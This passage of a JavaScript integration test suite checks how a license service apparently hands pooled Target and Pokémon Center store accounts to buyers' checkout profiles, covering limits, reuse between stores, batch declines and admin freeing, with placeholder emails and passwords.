    assert.equal((await accounts()).stores[0].free, before, "back on the list");
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 1, batch, stores: [{ name: "Target", n: 1, seller: 1 }] })).status, 200);
    assert.equal((await accounts()).stores[0].free, before - 1);
  });
  await test("if part of a batch went out, its accounts stay with it and sending again posts the same ones", async () => {
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Gus Seven", "gus@example.com")]), assigned: 1 }];
    for (let i = 0; i < 5; i++) files.push({ store: "Shop " + i, kind: "profiles", text: tgtCsv }, { store: "Shop " + i, kind: "logins", text: `c${i}@example.com:pw` });
    const batch = "asg4" + rid(), before = webhookPosts.length;
    webhookFail.push(0, 500);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch })).status, 502);
    const sentFirst = emailsOf(aycdOf(webhookPosts[before])[0])[0];
    assert.match(sentFirst, /^pool\d+@outlook\.com$/);
    assert.equal((await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch })).status, 200);
    assert.equal(emailsOf(aycdOf(webhookPosts.at(-2))[0])[0], sentFirst, "the same account");
  });
  await test("a license gets 10 accounts in all; the rest of its slots wait for the owner", async () => {
    const held = (await accounts()).given.filter((a) => a.key_last4 === ginaKey.slice(-4)).length;
    assert.equal(held, 5);
    const rows = Array.from({ length: 6 }, (_, i) => slotRow(`Hal H${i}`, `hal${i}@example.com`));
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 6 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 6, batch: "asg5" + rid(), stores: [{ name: "Target", n: 6, seller: 6 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 6, got: 5 } });
    const m = webhookPosts.at(-2), em = emailsOf(aycdOf(m)[0]);
    assert.match(webhookPosts.at(-1).content, /^⚠️ \*\*Only 3 Target accounts left\*\* on your list for Use Assigned Account\. Send more from FAFO/, "down to ACCOUNTS_LOW_AT (3 here): the owner is told");
    assert.match(m.content, /\nTarget 6 \(5 assigned accounts, 1 needs an account: this license is at its limit of 10\)\n/, "and why");
    assert.equal(em[5], "hal5@example.com", "the last one keeps its own email");
    assert.equal(plain(m)[0].text.split("\r\n").length, 5, "five login lines, for the first five rows");
    assert.deepEqual(plain(m)[0].text.split("\r\n").map((l) => l.split(":")[0]), em.slice(0, 5), "the logins file has the same emails, row for row");
  });
  await test("at its limit, a profile sent again with its slot switched off still gets back the account it had (app 1.9.99+)", async () => {
    const mine = (await accounts()).given.filter((a) => a.key_last4 === ginaKey.slice(-4)), free = (await accounts()).stores[0].free;
    assert.equal(mine.length, 10);
    const hal = mine.find((a) => a.profile === "Hal H0"), before = webhookPosts.length;
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv([slotRow("Hal H0", "hal0@example.com"), slotRow("Hal H9", "hal9@example.com")]), assigned: 2 }];
    const r = await (await slots("/submissions", ginaKey, { files, name: "Gina", slots: 2, batch: "asg5b" + rid(), stores: [{ name: "Target", n: 2, seller: 2 }], active: { target: ["Hal H1"] } })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 2, got: 1 } });
    const m = webhookPosts.slice(before).find((x) => x.content.startsWith("📦"));
    assert.match(m.content, /\nTarget 2 \(1 assigned account, 1 they had before, 1 needs an account: this license is at its limit of 10\)\n/);
    assert.deepEqual(emailsOf(aycdOf(m)[0]), [hal.email, "hal9@example.com"]); assert.deepEqual(plain(m)[0].text.split("\r\n").map((l) => l.split(":")[0]), [hal.email]);
    assert.equal((await accounts()).given.filter((a) => a.key_last4 === ginaKey.slice(-4)).length, 10, "still 10"); assert.equal((await accounts()).stores[0].free, free);
  });
  await test("the list running out: the rest wait for an account", async () => {
    assert.equal((await accounts()).stores[0].free, 3);
    const rows = Array.from({ length: 4 }, (_, i) => slotRow(`Ida I${i}`, `ida${i}@example.com`));
    const files = [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 4 }];
    const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 4, batch: "asg6" + rid(), stores: [{ name: "Target", n: 4, seller: 4 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 4, got: 3 } });
    assert.equal((await accounts()).stores[0].free, 0);
    assert.match(webhookPosts.at(-1).content, /^🚫 \*\*No Target accounts left\*\*/, "and told again when it runs out");
    assert.match(webhookPosts.at(-2).content, /^📦 /, "not told it's low a second time");
    const all = (await accounts()).given.map((a) => a.email);
    assert.equal(new Set(all).size, all.length, "no account given twice"); assert.equal(all.length, 13);
  });
  await test("pulling a slot tells the owner which account it had", async () => {
    const before = webhookPosts.length;
    const r = await (await pull(ginaKey, { keyId: "CSV", name: "Gina", slots: [{ store: "Target", profile: "Ann One", email: "Assigned account", card: "Visa 4242" }, { store: "Target", profile: "Nobody", email: "Assigned account" }] })).json();
    assert.equal(r.forwarded, true);
    const m = webhookPosts[before].content;
    assert.ok(m.includes(`Target · Ann One · ${first[0]} \\(assigned account\\) · Visa 4242`), m);
    assert.match(m, /Target · Nobody · Assigned account/);
    assert.doesNotMatch(m, /Test-Pw-1/);
  });
  await test("the owner can free an account, or all of a license's, and take one off the list", async () => {
    assert.equal((await admin("/admin/accounts/free", {})).status, 400);
    assert.deepEqual(await (await admin("/admin/accounts/free", { email: first[0].toUpperCase() })).json(), { ok: true, changed: 1 });
    assert.equal((await accounts()).stores[0].free, 1);
    assert.deepEqual(await (await admin("/admin/accounts/free", { key: bobKey })).json(), { ok: true, changed: 3 });
    assert.deepEqual(await (await admin("/admin/accounts/remove", { email: first[0] })).json(), { ok: true, changed: 1 });
    assert.deepEqual((await accounts()).stores, [{ store: "target", total: 12, free: 3, sent: 9 }]);
    assert.equal((await fetch(BASE + "/admin/accounts")).status, 401);
  });
  await test("apps before 1.9.58 (no assigned count) are posted as before", async () => {
    const files = [{ store: "Target", kind: "profiles", text: slotCsv([slotRow("Jo Old", "jo@example.com")]) }];
    const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 1, batch: "asg7" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
    assert.equal(r.accounts, undefined);
    const m = webhookPosts.at(-1);
    assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.deepEqual(plain(m), []); assert.deepEqual(emailsOf(aycdOf(m)[0]), ["jo@example.com"]);
  });
  await test("an offer nobody decided on expires, and its accounts are dropped", async () => {
    await slots("/accounts/offer", ginaKey, { store: "nike", storeName: "Nike", accounts: [{ email: "n1@outlook.com", password: "x1" }] });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content);
    await new Promise((ok) => setTimeout(ok, 8200));   // ACCOUNT_OFFER_TTL_MS is 8000 here
    const html = await (await offerPost(link, "add")).text();
    assert.match(html, /Expired before it was added/); assert.doesNotMatch(html, /n1@outlook\.com/);
    assert.ok(!(await accounts()).stores.some((x) => x.store === "nike"), "nothing added");
    assert.equal((await accounts()).offers.find((o) => o.store === "nike").status, "expired");
  });
  await test("once accounts are freed, running out is told again", async () => {
    assert.equal((await accounts()).stores[0].free, 3);
    const rows = Array.from({ length: 3 }, (_, i) => slotRow(`Kay K${i}`, `kay${i}@example.com`));
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", bobKey, { files: [{ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(rows), assigned: 3 }], name: "Bob", slots: 3, batch: "asg8" + rid(), stores: [{ name: "Target", n: 3, seller: 3 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 3, got: 3 } });
    const after = webhookPosts.slice(before).map((m) => m.content.slice(0, 2));
    assert.deepEqual(after, ["📦", "🚫"], "the batch, then one message that it ran out (not a second one that it's low)");
  });
  await test("refusing sent accounts adds nothing", async () => {
    await slots("/accounts/offer", ginaKey, { store: "walmart", storeName: "Walmart", accounts: [{ email: "w1@outlook.com", password: "x1" }] });
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content);
    assert.match(await (await offerPost(link, "refuse")).text(), /Refused\. Nothing was added\./);
    assert.ok(!(await accounts()).stores.some((x) => x.store === "walmart"));
  });
  console.log("\nPokémon Center reuses a profile's Target account (2026-10-06)");
  // Ivan sends the owner's accounts; Hana is a buyer. Slots on Use Assigned Account come with no email of their own.
  let hanaKey, ivanKey;
  const offerAdd = async (key, store, storeName, list) => {
    assert.equal((await slots("/accounts/offer", key, { store, storeName, accounts: list })).status, 200);
    await new Promise((ok) => setTimeout(ok, 400));
    const link = offerLink(webhookPosts.at(-1).content); assert.ok(link, webhookPosts.at(-1).content);
    assert.match(await (await offerPost(link, "add")).text(), /Added \d+ to your list/);
  };
  const batchPost = (from) => webhookPosts.slice(from).find((m) => m.content.startsWith("📦"));
  const pcFile = (names, assigned) => ({ store: "Pokémon Center", storeKey: "pokemoncenter", kind: "profiles", text: slotCsv(names.map((n) => slotRow(n, ""))), assigned: assigned ?? names.length });
  const tgFile = (names) => ({ store: "Target", storeKey: "target", kind: "profiles", text: slotCsv(names.map((n) => slotRow(n, ""))), assigned: names.length });
  const given = async () => (await accounts()).given.filter((a) => a.key_last4 === hanaKey.slice(-4));
  const pcStock = async () => (await accounts()).stores.find((x) => x.store === "pokemoncenter");
  let tA, tB;
  await test("setup: a buyer, and the owner's Target and Pokémon Center accounts", async () => {
    hanaKey = await newKey("hana"); ivanKey = await newKey("ivan");
    await offerAdd(ivanKey, "target", "Target", [{ email: "tgt1@outlook.com", password: "Tgt-Pw-1!" }, { email: "tgt2@outlook.com", password: "Tgt-Pw-1!" }]);
    await offerAdd(ivanKey, "pokemoncenter", "Pokémon Center", [1, 2, 3].map((i) => ({ email: `pc${i}@outlook.com`, password: "Pc-Pw-1!" })));
    assert.deepEqual(await pcStock(), { store: "pokemoncenter", total: 3, free: 3, sent: 0 });
  });
  await test("in one batch, a profile's Pokémon Center slot gets the Target account it was given; others get their own", async () => {
    const before = webhookPosts.length;
    // The app sends Pokémon Center before Target; Hana C has no Target slot.
    const files = [pcFile(["Hana A", "Hana C", "Hana B"]), tgFile(["Hana A", "Hana B"])];
    const r = await (await slots("/submissions", hanaKey, { files, name: "Hana", slots: 5, batch: "pcr1" + rid(),
      stores: [{ name: "Pokémon Center", n: 3, seller: 3 }, { name: "Target", n: 2, seller: 2 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 3, got: 3, reused: 2 }, Target: { asked: 2, got: 2 } });
    const m = batchPost(before);
    assert.match(m.content, /\nPokémon Center 3 \(3 assigned accounts, 2 reused from Target\) · Target 2 \(2 assigned accounts\)\n/);
    const [tgLog, ...more] = plain(m), [pcA, tgA] = aycdOf(m);
    assert.equal(more.length, 0, "only Target's logins file: Pokémon Center's email is on its AYCD profiles");
    [tA, tB] = emailsOf(tgA);
    assert.ok(/^tgt[12]@outlook\.com$/.test(tA) && /^tgt[12]@outlook\.com$/.test(tB) && tA !== tB, [tA, tB]);
    assert.equal(tgLog.text, `${tA}:Tgt-Pw-1!\r\n${tB}:Tgt-Pw-1!`);
    const pc = emailsOf(pcA);
    assert.deepEqual(pcA.map((x) => x.name), ["Hana A", "Hana C", "Hana B"], "rows in the order sent");
    assert.equal(pc[0], tA); assert.equal(pc[2], tB); assert.match(pc[1], /^pc[123]@outlook\.com$/);
    assert.deepEqual(aycdOf(m)[0].map((x) => [x.name, x.shippingAddress.email, x.billingAddress.email]), [["Hana A", tA, tA], ["Hana C", pc[1], pc[1]], ["Hana B", tB, tB]]);
    assert.deepEqual(await pcStock(), { store: "pokemoncenter", total: 3, free: 2, sent: 1 }, "the reused ones aren't on the Pokémon Center list");
    const g = await given();
    assert.deepEqual(g.filter((a) => a.store === "pokemoncenter").map((a) => [a.email, a.profile, a.store_name, a.reused]).sort(),
      [[tA, "Hana A", "Pokémon Center", 1], [tB, "Hana B", "Pokémon Center", 1], [pc[1], "Hana C", "Pokémon Center", 0]].sort());
  });
  await test("a later batch reuses a Target account sent before, and pulling the slot finds it at Pokémon Center", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [pcFile(["Hana A"])], name: "Hana", slots: 1, batch: "pcr2" + rid(), stores: [{ name: "Pokémon Center", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 1, got: 1, reused: 1 } });
    const m = batchPost(before);
    assert.equal(emailsOf(aycdOf(m)[0])[0], tA); assert.deepEqual(plain(m), [], "no logins file");
    const p0 = webhookPosts.length;
    await pull(hanaKey, { keyId: "CSV", name: "Hana", slots: [{ store: "Pokémon Center", profile: "Hana A", email: "Assigned account", card: "Visa 4242" }] });
    assert.ok(webhookPosts[p0].content.includes(`Pokémon Center · Hana A · ${tA} \\(assigned account\\)`), webhookPosts[p0].content);
    assert.doesNotMatch(webhookPosts[p0].content, /Tgt-Pw-1/);
  });
  await test("an email on the Pokémon Center list too is used from there", async () => {
    await offerAdd(ivanKey, "target", "Target", [{ email: "lia.tgt@outlook.com", password: "Tgt-Pw-2!" }]);
    await offerAdd(ivanKey, "pokemoncenter", "Pokémon Center", [{ email: "LIA.TGT@outlook.com", password: "Inbox-Pw-2!" }]);
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [tgFile(["Lia Moss"]), pcFile(["Lia Moss"])], name: "Hana", slots: 2, batch: "pcr3" + rid(),
      stores: [{ name: "Target", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1 }, "Pokémon Center": { asked: 1, got: 1, reused: 1 } });
    const [tgLog, ...more] = plain(batchPost(before)), [tg, pc] = aycdOf(batchPost(before));
    assert.equal(more.length, 0);
    assert.equal(emailsOf(tg)[0], "lia.tgt@outlook.com"); assert.equal(tgLog.text, "lia.tgt@outlook.com:Tgt-Pw-2!");
    assert.equal(emailsOf(pc)[0], "LIA.TGT@outlook.com", "the list's own row (its spelling)");
    assert.deepEqual(await pcStock(), { store: "pokemoncenter", total: 4, free: 2, sent: 2 }, "taken from the list like any other");
  });
  await test("a batch that doesn't reach the channel drops its reused accounts; nothing joins the Pokémon Center list", async () => {
    await offerAdd(ivanKey, "target", "Target", [{ email: "tgt3@outlook.com", password: "Tgt-Pw-1!" }]);
    const batch = "pcr4" + rid(), stock = await pcStock();
    webhookFail.push(500);
    assert.equal((await slots("/submissions", hanaKey, { files: [pcFile(["Hana D"]), tgFile(["Hana D"])], name: "Hana", slots: 2, batch,
      stores: [{ name: "Pokémon Center", n: 1, seller: 1 }, { name: "Target", n: 1, seller: 1 }] })).status, 502);
    assert.deepEqual(await pcStock(), stock);
    assert.ok(!(await accounts()).given.some((a) => a.email === "tgt3@outlook.com"), "neither the Target account nor its reuse is held");
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [pcFile(["Hana D"]), tgFile(["Hana D"])], name: "Hana", slots: 2, batch,
      stores: [{ name: "Pokémon Center", n: 1, seller: 1 }, { name: "Target", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 1, got: 1, reused: 1 }, Target: { asked: 1, got: 1 } }, "sending again reuses it again");
    assert.equal(emailsOf(aycdOf(batchPost(before))[0])[0], "tgt3@outlook.com");
    assert.deepEqual(await pcStock(), stock);
  });
  await test("with the Pokémon Center list out, a reused account still goes out, and slots left without one come last", async () => {
    const before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [pcFile(["Hana E", "Hana F", "Hana G", "Hana B"])], name: "Hana", slots: 4, batch: "pcr5" + rid(),
      stores: [{ name: "Pokémon Center", n: 4, seller: 4 }] })).json();
    assert.deepEqual(r.accounts, { "Pokémon Center": { asked: 4, got: 3, reused: 1 } });
    const m = batchPost(before), list = aycdOf(m)[0], em = emailsOf(list);
    assert.deepEqual(plain(m), [], "no logins file");
    assert.match(m.content, /\nPokémon Center 4 \(3 assigned accounts, 1 reused from Target, 1 needs an account: your list has none\)\n/);
    assert.deepEqual(list.map((x) => x.name), ["Hana E", "Hana F", "Hana B", "Hana G"]);
    assert.ok(/^pc[123]@outlook\.com$/.test(em[0]) && /^pc[123]@outlook\.com$/.test(em[1]), em); assert.equal(em[2], tB); assert.equal(em[3], "");
    assert.deepEqual(aycdOf(m)[0].map((x) => [x.name, x.shippingAddress.email]), [["Hana E", em[0]], ["Hana F", em[1]], ["Hana B", tB], ["Hana G", ""]], "the AYCD list in the same order");
  });
  await test("sending the owner's list an email given out as a reused account puts it on the list, still with its slot", async () => {
    await offerAdd(hanaKey, "pokemoncenter", "Pokémon Center", [{ email: tA.toUpperCase(), password: "Inbox-Pw-3!" }]);
    assert.deepEqual(await pcStock(), { store: "pokemoncenter", total: 5, free: 0, sent: 5 });
    assert.equal((await given()).find((a) => a.store === "pokemoncenter" && a.email === tA).reused, 0);
    const before = webhookPosts.length;
    await slots("/submissions", hanaKey, { files: [pcFile(["Hana A"])], name: "Hana", slots: 1, batch: "pcr6" + rid(), stores: [{ name: "Pokémon Center", n: 1, seller: 1 }] });
    const m = batchPost(before);
    assert.equal(emailsOf(aycdOf(m)[0])[0], tA, "Hana A keeps it"); assert.deepEqual(plain(m), []);
  });
  await test("freeing a license's accounts drops its reused ones", async () => {
    assert.equal((await admin("/admin/accounts/free", { key: hanaKey })).status, 200);
    assert.deepEqual(await given(), []);
    const d = await accounts();
    assert.deepEqual(d.stores.find((x) => x.store === "pokemoncenter"), { store: "pokemoncenter", total: 5, free: 5, sent: 0 });
    assert.ok(!d.given.some((a) => a.reused), "no reused rows left");
  });
  await test("declining a batch puts the accounts given to its slots back on the list, and drops its reused ones", async () => {
    const tStock = async () => (await accounts()).stores.find((x) => x.store === "target");
    const t0 = await tStock(), p0 = await pcStock(), before = webhookPosts.length;
    const r = await (await slots("/submissions", hanaKey, { files: [tgFile(["Hana Q"]), pcFile(["Hana Q"])], name: "Hana", slots: 2, batch: "dcl" + rid(),
      stores: [{ name: "Target", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1, seller: 1 }] })).json();
    assert.deepEqual(r.accounts, { Target: { asked: 1, got: 1 }, "Pokémon Center": { asked: 1, got: 1, reused: 1 } });
    const g = await given();
    assert.equal(g.length, 2, "the Target account, and its reuse at Pokémon Center");
    // Usually 1 of the owner's own: the Pokémon Center one is a reuse, unless that email is on the Pokémon Center list too.
    const own = g.filter((a) => !a.reused).length, n = `${own} account${own === 1 ? "" : "s"}`;
    const link = approveLink(batchPost(before).content);
    assert.match(await (await approvePost(link, "decline-ask")).text(), new RegExp(`The ${n} given to them go${own === 1 ? "es" : ""} back on your list\\.`));
    assert.match(await (await approvePost(link, "decline")).text(), new RegExp(`Declined\\. Their FAFO now shows these slots as Declined\\. ${n} given to them ${own === 1 ? "is" : "are"} back on your list\\.`));
    assert.deepEqual(await given(), []);
    assert.deepEqual(await tStock(), t0); assert.deepEqual(await pcStock(), p0);
    assert.ok(!(await accounts()).given.some((a) => a.reused), "no reused rows left");
  });
  // 2026-10-07, the owner's request: a Target account its profile's Pokémon Center slot (in another batch) still checks
  // out with doesn't go back on the list, where another buyer's Target slot could get it.
  const tStock = async () => (await accounts()).stores.find((x) => x.store === "target");
  // Quinn is the buyer here (Hana has sent close to the hourly limit of batches).
  let quinnKey;
  const held = async (email) => (await accounts()).given.filter((a) => a.key_last4 === quinnKey.slice(-4) && a.email === email).map((a) => [a.store, a.batch, a.reused]).sort();
  const pcPull = (batch, profile) => pull(quinnKey, { keyId: "CSV", name: "Quinn", batch, slots: [{ store: "Pokémon Center", profile, email: "Assigned account", card: "Visa 4242" }] });
  let owenKey, fillLink;
  const sendBatch = async (files, stores) => {
    const batch = "kp" + rid(), before = webhookPosts.length;
    const r = await (await slots("/submissions", quinnKey, { files, name: "Quinn", slots: stores.reduce((n, x) => n + x.n, 0), batch, stores })).json();
    const m = batchPost(before);
    return { batch, r, m, link: approveLink(m.content), emails: aycdOf(m).map(emailsOf) };
  };
  const TG1 = [{ name: "Target", n: 1, seller: 1 }], PC1 = [{ name: "Pokémon Center", n: 1, seller: 1 }];
  await test("declining a Target batch keeps its account while the profile's Pokémon Center slot in another batch uses it", async () => {
    // Owen holds every free Target account until the last of these tests, so Hana's come from keep1 and keep2 (each test
    // gives its own back), neither of which is on the Pokémon Center list too.
    owenKey = await newKey("owen"); quinnKey = await newKey("quinn");
    const free = (await tStock()).free, names = Array.from({ length: free }, (_, i) => `Owen ${i + 1}`), before = webhookPosts.length;
    const f = await (await slots("/submissions", owenKey, { files: [tgFile(names)], name: "Owen", slots: free, batch: "fill" + rid(), stores: [{ name: "Target", n: free, seller: free }] })).json();
    assert.deepEqual(f.accounts, { Target: { asked: free, got: free } }, "Owen holds them all");
    fillLink = approveLink(batchPost(before).content);
    await offerAdd(owenKey, "target", "Target", [{ email: "keep1@outlook.com", password: "Tgt-Pw-4!" }, { email: "keep2@outlook.com", password: "Tgt-Pw-4!" }]);
    const t = await sendBatch([tgFile(["Quinn K"])], TG1);
    const [[tk]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn K"])], PC1);
    assert.deepEqual(p.r.accounts, { "Pokémon Center": { asked: 1, got: 1, reused: 1 } });
    assert.equal(p.emails[0][0], tk, "the Pokémon Center slot checks out with the Target account");
    const t0 = await tStock(), p0 = await pcStock();
    const ask = await (await approvePost(t.link, "decline-ask")).text();
    assert.match(ask, /1 Target account stays with them: their Pokémon Center slot in another batch uses it too\./, ask);
    assert.doesNotMatch(ask, /back on your list/, "nothing goes back");
    const done = await (await approvePost(t.link, "decline")).text();
    assert.match(done, /Declined\. Their FAFO now shows these slots as Declined\. 1 Target account stays with them: their Pokémon Center slot in another batch uses it too\./, done);
    assert.deepEqual(await tStock(), t0, "not back on the Target list");
    assert.deepEqual(await held(tk), [["pokemoncenter", p.batch, 1], ["target", "parked:" + t.batch, 0]], "held by the buyer, parked");
    // Declining the batch that uses it puts it back, and drops the reuse.
    const ask2 = await (await approvePost(p.link, "decline-ask")).text();
    assert.match(ask2, /The 1 account given to them goes back on your list\./, ask2);
    assert.doesNotMatch(ask2, /stays with them/);
    assert.match(await (await approvePost(p.link, "decline")).text(), /Declined\. Their FAFO now shows these slots as Declined\. 1 account given to them is back on your list\./);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
    assert.deepEqual(await pcStock(), p0);
    assert.deepEqual(await held(tk), []);
  });
  await test("a Pokémon Center slot sent again takes its account along; declining a batch of only reuses drops them", async () => {
    const t = await sendBatch([tgFile(["Quinn M"])], TG1);
    const [[tm]] = t.emails;
    const p1 = await sendBatch([pcFile(["Quinn M"])], PC1);
    await pcPull(p1.batch, "Quinn M");
    const p2 = await sendBatch([pcFile(["Quinn M"])], PC1);
    assert.equal(p2.emails[0][0], tm, "the same account again");
    assert.deepEqual(await held(tm), [["pokemoncenter", p2.batch, 1], ["target", t.batch, 0]], "the reuse moved to the batch it's in now");
    const t0 = await tStock();
    // The batch it was in before: declining it leaves the account with the slot sent again.
    const d1 = await (await approvePost(p1.link, "decline")).text();
    assert.match(d1, /Declined\. Their FAFO now shows these slots as Declined\./, d1);
    assert.doesNotMatch(d1, /back on your list|stays with them/, "it held nothing");
    assert.deepEqual(await held(tm), [["pokemoncenter", p2.batch, 1], ["target", t.batch, 0]]);
    // Its batch holds only that reuse (the Target account is the Target batch's): declining it drops the reuse.
    await approvePost(p2.link, "decline");
    assert.deepEqual(await held(tm), [["target", t.batch, 0]], "the reuse is gone; the Target slot keeps its account");
    assert.deepEqual(await tStock(), t0);
    // With no reuse left, declining the Target batch puts its account back.
    await approvePost(t.link, "decline");
    assert.deepEqual(await held(tm), []);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
  });
  await test("a slot sent again whose batch doesn't reach the channel leaves its account where it was", async () => {
    const t = await sendBatch([tgFile(["Quinn N"])], TG1);
    const [[tn]] = t.emails;
    const p1 = await sendBatch([pcFile(["Quinn N"])], PC1);
    await pcPull(p1.batch, "Quinn N");
    webhookFail.push(500);
    assert.equal((await slots("/submissions", quinnKey, { files: [pcFile(["Quinn N"])], name: "Quinn", slots: 1, batch: "kpf" + rid(), stores: PC1 })).status, 502);
    assert.deepEqual(await held(tn), [["pokemoncenter", p1.batch, 1], ["target", t.batch, 0]], "still in the batch that reached the channel");
    const t0 = await tStock();
    // So declining the Target batch keeps it (that batch's slot uses it), and declining that one puts it back.
    assert.match(await (await approvePost(t.link, "decline")).text(), /1 Target account stays with them/);
    assert.match(await (await approvePost(p1.link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual(await held(tn), []);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
  });
  await test("a declined Target slot sent again gets back the account its Pokémon Center slot kept", async () => {
    const t = await sendBatch([tgFile(["Quinn R"])], TG1);
    const [[tr]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn R"])], PC1);
    await approvePost(t.link, "decline");
    const t0 = await tStock();
    const t2 = await sendBatch([tgFile(["Quinn R"])], TG1);
    assert.deepEqual(t2.r.accounts, { Target: { asked: 1, got: 1 } });
    assert.equal(t2.emails[0][0], tr, "the same email at both stores again");
    assert.deepEqual(await tStock(), t0, "no second account taken from the list");
    assert.deepEqual(await held(tr), [["pokemoncenter", p.batch, 1], ["target", t2.batch, 0]]);
    await approvePost(p.link, "decline");
    assert.deepEqual(await held(tr), [["target", t2.batch, 0]], "the Target slot sent again keeps it");
    await approvePost(t2.link, "decline");
    assert.deepEqual(await held(tr), []);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
  });
  await test("approved, pulled and sent again: declining the new batch puts back the Target account kept for it", async () => {
    const t = await sendBatch([tgFile(["Quinn S"])], TG1);
    const [[ts]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn S"])], PC1);
    await approvePost(t.link, "decline");
    await approvePost(p.link, "approve");
    await pcPull(p.batch, "Quinn S");
    const p3 = await sendBatch([pcFile(["Quinn S"])], PC1);
    assert.deepEqual(await held(ts), [["pokemoncenter", p3.batch, 1], ["target", "parked:" + t.batch, 0]]);
    const t0 = await tStock();
    assert.match(await (await approvePost(p3.link, "decline-ask")).text(), /The 1 account given to them goes back on your list\./);
    assert.match(await (await approvePost(p3.link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual(await held(ts), []);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
  });
  await test("freeing a Target account by hand drops its reuse at Pokémon Center too", async () => {
    const t = await sendBatch([tgFile(["Quinn P"]), pcFile(["Quinn P"])], [...TG1, ...PC1]);
    const [[tp], [pp]] = t.emails;
    assert.equal(pp, tp);
    assert.equal((await held(tp)).length, 2);
    assert.equal((await admin("/admin/accounts/free", { email: tp, store: "target" })).status, 200);
    assert.deepEqual(await held(tp), [], "neither is held");
  });
  await test("freeing the Pokémon Center account by hand puts back the Target account kept for it", async () => {
    const t = await sendBatch([tgFile(["Quinn T"])], TG1);
    const [[tt]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn T"])], PC1);
    await approvePost(t.link, "decline");
    assert.deepEqual(await held(tt), [["pokemoncenter", p.batch, 1], ["target", "parked:" + t.batch, 0]]);
    const t0 = await tStock();
    assert.equal((await admin("/admin/accounts/free", { email: tt, store: "pokemoncenter" })).status, 200);
    assert.deepEqual(await held(tt), [], "the reuse is gone, and the Target account it kept is back");
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
    await approvePost(p.link, "decline");
  });
  await test("declining the old batch while the slot sent again is posting leaves the account with the new one", async () => {
    const t = await sendBatch([tgFile(["Quinn U"])], TG1);
    const [[tu]] = t.emails;
    const p1 = await sendBatch([pcFile(["Quinn U"])], PC1);
    await pcPull(p1.batch, "Quinn U");
    webhookHang = { ms: 2500 };
    const sending = sendBatch([pcFile(["Quinn U"])], PC1);
    await new Promise((ok) => setTimeout(ok, 1000));
    assert.match(await (await approvePost(p1.link, "decline")).text(), /Declined\./);
    const p2 = await sending;
    assert.equal(p2.emails[0][0], tu);
    assert.deepEqual(await held(tu), [["pokemoncenter", p2.batch, 1], ["target", t.batch, 0]], "the posted batch has it; the declined one didn't free it");
    // Same with a declined Target slot sent again while its Pokémon Center batch is declined.
    await approvePost(t.link, "decline");
    assert.deepEqual(await held(tu), [["pokemoncenter", p2.batch, 1], ["target", "parked:" + t.batch, 0]]);
    webhookHang = { ms: 2500 };
    const resend = sendBatch([tgFile(["Quinn U"])], TG1);
    await new Promise((ok) => setTimeout(ok, 1000));
    await approvePost(p2.link, "decline");
    const t2 = await resend;
    assert.equal(t2.emails[0][0], tu, "it gets its account back");
    assert.deepEqual(await held(tu), [["target", t2.batch, 0]], "and keeps it, though its Pokémon Center slot was declined meanwhile");
    await approvePost(t2.link, "decline");
    assert.deepEqual(await held(tu), []);
  });
  await test("a reuse the worker before 2026-10-07 left in a declined batch still counts as in use", async () => {
    // That worker skipped declines of batches holding only reuses, and a slot sent again kept using the reuse where it
    // was. Made here by marking the Pokémon Center batch declined in the database (this worker would drop its reuse).
    const sql = (cmd) => execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), "--command", cmd], { cwd: root, env, stdio: "pipe" });
    const t = await sendBatch([tgFile(["Quinn L"])], TG1);
    const [[tl]] = t.emails;
    const p = await sendBatch([pcFile(["Quinn L"])], PC1);
    sql(`UPDATE submission_reviews SET status = 'declined', decided_at = 1 WHERE id = '${p.batch}'`);
